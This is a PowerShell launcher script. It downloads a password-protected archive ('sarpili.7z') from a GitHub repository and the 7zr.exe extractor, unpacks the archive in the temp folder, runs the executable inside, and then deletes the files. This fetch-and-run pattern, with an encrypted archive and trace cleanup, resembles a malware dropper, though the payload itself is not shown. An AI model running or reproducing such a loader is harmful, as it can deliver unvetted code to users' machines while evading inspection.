param (
    [string]$Password = $null # Accepts the password as a parameter
)

if (-not $Password) {
    # Prompt for the password if not provided via the command line
    $securePassword = Read-Host -Prompt "Enter the password for the 7z archive" -AsSecureString
    $Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword))
}

# Temporary paths
$tempFolder = [System.IO.Path]::Combine($env:TEMP, "temp_folder")
$archiveName = "sarpili.7z" # Name of the 7z file being downloaded (Update if needed)
$tempArchive = [System.IO.Path]::Combine($env:TEMP, $archiveName)
$temp7zr = [System.IO.Path]::Combine($tempFolder, "7zr.exe")

# Extract the archive name without the extension and append ".exe" for the executable
$executableName = [System.IO.Path]::GetFileNameWithoutExtension($archiveName) + ".exe"
$extractedFile = [System.IO.Path]::Combine($tempFolder, $executableName)

# URLs
$archiveDownloadUrl = "https://raw.githubusercontent.com/voidelixir/sarpili/main/sarpili.7z" # Update the 7z file URL
$sevenZipExeUrl = "https://7-zip.org/a/7zr.exe" # 7zr.exe tool for extracting

# Ensure the temporary folder exists
if (-Not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

# Step 1: Download the 7z archive
Write-Host "Downloading the 7z archive..."
Invoke-RestMethod -Uri $archiveDownloadUrl -OutFile $tempArchive

# Step 2: Download 7zr.exe to the temp folder
Write-Host "Downloading 7zr.exe for extraction..."
Invoke-RestMethod -Uri $sevenZipExeUrl -OutFile $temp7zr

# Step 3: Extract the 7z archive using 7zr.exe and the provided password
Write-Host "Extracting the 7z archive..."
Start-Process -FilePath $temp7zr -ArgumentList "x `"$tempArchive`" -p$Password -o`"$tempFolder`" -y" -NoNewWindow -Wait

# Step 4: Check if the executable exists and run it
if (Test-Path -Path $extractedFile) {
    Write-Host "Executing the extracted file..."
    Start-Process -FilePath $extractedFile -Wait
} else {
    Write-Host "Error: Extracted executable file '$executableName' not found in $tempFolder!"
    # Optional: List contents of the extraction folder for debugging
    Get-ChildItem -Path $tempFolder -Recurse
}

# Step 5: Clean up temporary files and folders
Write-Host "Cleaning up temporary files..."
Remove-Item -Path $tempArchive -Force
Remove-Item -Path $temp7zr -Force
Remove-Item -Path $tempFolder -Recurse -Force
Write-Host "All temporary files have been removed."
